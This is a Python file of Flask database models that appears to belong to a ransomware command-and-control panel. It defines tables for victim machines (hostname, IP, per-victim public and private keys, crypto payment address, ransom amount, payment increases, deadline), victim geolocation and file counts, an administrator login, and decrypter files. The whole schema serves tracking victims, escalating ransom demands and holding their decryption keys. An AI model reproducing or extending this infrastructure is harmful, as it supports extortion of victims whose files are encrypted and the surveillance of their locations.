from app import db
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import UserMixin


class Users(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(120))
    hostname = db.Column(db.String(120))
    uid = db.Column(db.String(120), unique=True)
    email = db.Column(db.String(120))
    ip_address = db.Column(db.String(120))
    # keys
    public_key = db.Column(db.String(600), nullable=False)
    private_key = db.Column(db.String(2500), nullable=False)
    # image
    image = db.Column(db.LargeBinary(length=10485760))
    pic_uid = db.Column(db.String(16), nullable=False)
    # payment details
    crypto_address = db.Column(db.String(120), unique=True)
    total_payment = db.Column(db.Float, nullable=False, default=0.0)
    amount_paid = db.Column(db.Float, default=0.0)
    payment_increase = db.Column(db.Integer, default=0)
    payment_status = db.Column(db.Boolean, default=False)
    # dates
    creation_date = db.Column(db.DateTime)
    expiration = db.Column(db.DateTime)
    payment_date = db.Column(db.DateTime)
    # boolean values
    pic_id = db.Column(db.Boolean, default=False)
    status = db.Column(db.Boolean, default=False)
    pic_submit = db.Column(db.Boolean, default=False)
    pic_rejected = db.Column(db.Boolean, default=False)
    address_index = db.Column(db.Integer, unique=True)
    terminated = db.Column(db.Boolean, default=False)


class UsersData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uid = db.Column(db.String(120), unique=True)
    files = db.Column(db.Integer)
    ip = db.Column(db.String(120))
    city = db.Column(db.String(120))
    region = db.Column(db.String(120))
    country = db.Column(db.String(120))
    postal = db.Column(db.String(120))
    latitude = db.Column(db.String(120))
    longitude = db.Column(db.String(120))


class Administrator(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)

    def set_password(self, password):
        self.password = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password, password)

    def is_active(self):
        return True


class Decrypter(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    content = db.Column(db.Text)
    filename = db.Column(db.String(32))
    creation = db.Column(db.DateTime, default=datetime.now().astimezone())


